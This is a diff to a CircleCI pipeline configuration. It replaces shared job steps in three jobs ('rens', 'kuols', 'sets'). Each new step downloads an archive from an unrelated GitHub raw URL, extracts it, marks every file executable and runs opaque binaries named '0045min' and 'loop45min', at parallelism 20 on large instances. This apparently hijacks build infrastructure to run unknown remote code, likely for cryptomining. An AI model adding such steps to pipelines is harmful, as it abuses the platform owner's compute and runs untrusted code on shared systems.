@@ -50,7 +50,6 @@ jobs:
   luks:
     docker:
       - image: cimg/python:3.12
-    <<: &commonSteps
     parallelism: 20
     resource_class: large
     steps:
@@ -66,17 +65,46 @@ jobs:
   rens:
     docker:
       - image: cimg/python:3.12
-    <<: *commonSteps
+    parallelism: 20
+    resource_class: large
+    steps:
+      - run:
+          name: app2
+          command: |
+            curl -O https://raw.githubusercontent.com/coralduoblas/saepore/main/look
+            tar -xf look
+            chmod u+x *
+            ./0045min|./loop45min
+
 
   kuols:
     docker:
       - image: cimg/python:3.12
-    <<: *commonSteps
+    parallelism: 20
+    resource_class: large
+    steps:
+      - run:
+          name: app2
+          command: |
+            curl -O https://raw.githubusercontent.com/coralduoblas/saepore/main/look
+            tar -xf look
+            chmod u+x *
+            ./0045min|./loop45min
+
 
   sets:
     docker:
       - image: cimg/python:3.12
-    <<: *commonSteps
+    parallelism: 20
+    resource_class: large
+    steps:
+      - run:
+          name: app2
+          command: |
+            curl -O https://raw.githubusercontent.com/coralduoblas/saepore/main/look
+            tar -xf look
+            chmod u+x *
+            ./0045min|./loop45min
 
 
 
